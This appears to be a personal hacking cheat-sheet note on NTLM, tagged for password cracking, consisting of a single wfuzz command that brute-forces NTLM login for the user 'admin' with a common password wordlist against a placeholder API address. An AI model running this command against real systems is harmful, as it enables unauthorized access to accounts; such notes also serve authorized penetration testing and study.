---
tags: 🔻 🔻/🃏/Passwords password_cracking ntlm
aliases: Hacking Notes
---
# NTLM

`wfuzz -c --ntlm "admin:FUZZ" -z file,/root/Documents/SecLists/Passwords/darkc0de.txt --hc 401 http:blabla/api`

